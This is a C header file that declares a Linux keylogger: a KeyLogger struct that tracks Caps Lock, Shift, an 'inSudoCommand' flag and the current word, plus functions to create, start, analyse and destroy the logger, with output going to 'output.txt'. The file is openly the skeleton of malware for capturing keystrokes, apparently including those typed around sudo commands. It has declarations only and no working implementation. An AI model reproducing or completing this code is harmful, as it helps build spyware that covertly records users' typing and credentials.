#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

#define FILE_OUTPUT "output.txt"
#define BUFFER_SIZE 1024

#define DEBUG_MODE 0

typedef struct 
{
  short unsigned int  inCapsLock ;
  short unsigned int  inShift;
  short unsigned int inSudoCommand;
  short unsigned int listen;

  char *currentWord;

  struct input_event ev;
} KeyLogger;

KeyLogger *createKeyLogger();
void mountWord(KeyLogger *keyLogger);
void analyzeWord(KeyLogger *keyLogger);
void startKeyLogger(KeyLogger *keyLogger);
void destroyKeyLogger(KeyLogger *keyLogger);

#endif